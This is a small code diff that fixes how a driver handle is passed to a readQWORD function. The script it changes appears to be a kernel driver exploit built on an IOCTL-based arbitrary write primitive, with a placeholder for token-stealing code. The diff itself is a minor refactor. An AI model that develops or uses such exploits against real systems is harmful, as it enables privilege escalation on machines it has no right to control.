@@ -153,7 +153,7 @@ def writeQWORD(driver, what=None, where=None):
     return triggerIOCTL
 
 
-def readQWORD(driver, what=None, where=None):
+def readQWORD(driver_handle, what=None, where=None):
 
     # token finding code here
 
@@ -239,7 +239,7 @@ def executeOverwrite():
 
         writeQWORD(driver_handle, 0x4142434445464748,
                    0x000000001a002000)
-        readQWORD()
+        readQWORD(driver_handle)
 
 
 executeOverwrite()
